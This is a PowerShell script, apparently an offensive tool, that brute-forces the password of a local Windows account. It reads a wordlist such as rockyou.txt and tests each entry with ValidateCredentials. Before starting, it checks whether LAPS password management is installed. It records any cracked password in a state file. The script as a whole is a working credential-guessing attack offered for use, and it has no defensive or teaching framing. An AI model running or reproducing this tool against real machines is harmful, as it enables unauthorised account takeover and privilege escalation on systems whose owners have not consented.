Function CheckLAPS {

    if ((Test-Path -Path 'C:\Program Files\LAPS\CSE\Admpwd.dll') -or
    (Test-Path -Path 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll') -or
    (Test-Path -Path 'C:\Program Files\LAPS\CSE\') -or
    (Test-Path -Path 'C:\Program Files (x86)\LAPS\CSE\')) {
        Write-Output "LAPS is active. Sorry."
        
        $continue = Read-Host "Do you want to continue anyway? (Type 'Y' for Yes or 'N' for No)"
        $continue = $continue.ToUpper()
        if ($continue -ne 'Y') {
            exit
        }
    } else {
        "LAPS not detected ... ENJOY"
    }
}

Function localbrute {
 
    param($u, $dct, $debug)
    CheckLAPS
    $name = Get-LocalUser | Select-Object -ExpandProperty Name
    $userExists = $false
    foreach($i in $name) {
        if ($i -eq $u) {
            $userExists = $true
            Write-Output "User $i exists among local users."
        }
    }

    if (-not $userExists) {
        Write-Output "User $u does not exist among local users."
        return
    }

    $d = $dct -replace ".*\\" -replace ".*/"

    $index = (Get-Content .\localbrute.state | Where-Object { $_ -match "^${u}:${d}:" } | Select-Object -Last 1 -ErrorAction SilentlyContinue) -split ":" | Select-Object -Index 2
    if ($index) {
        Write-Output "Password for $u account already found: $index"
        return
    }

    $index = 0

    $dictionary = [System.IO.File]::ReadLines($dct)

    $dictionary | ForEach-Object -Begin { $i = 0 } -Process {
        $password = $_
        if ($i -ge $index) {
            if ($debug) { Write-Output "DEBUG: trying password [${i}]: $password" }
            try {
                Add-Type -AssemblyName System.DirectoryServices.AccountManagement
                $contextType = [DirectoryServices.AccountManagement.ContextType]::Machine
                $principalContext = [DirectoryServices.AccountManagement.PrincipalContext]::new($contextType)
                if ($principalContext.ValidateCredentials($u, $password)) {
                    Write-Output "${u}:${d}:True:${password}" >> localbrute.state
                    Write-Output "Password for $u account found: $password"
                    break
                }
            } catch {

            }
        }
        $i++
    }

    Write-Output "${u}:${d}:${i}:${password}" >> localbrute.state
}
# Exemple localbrute -u "admin" -dct "rockyou.txt" $true
localbrute -u "" -dct "" -debug $true
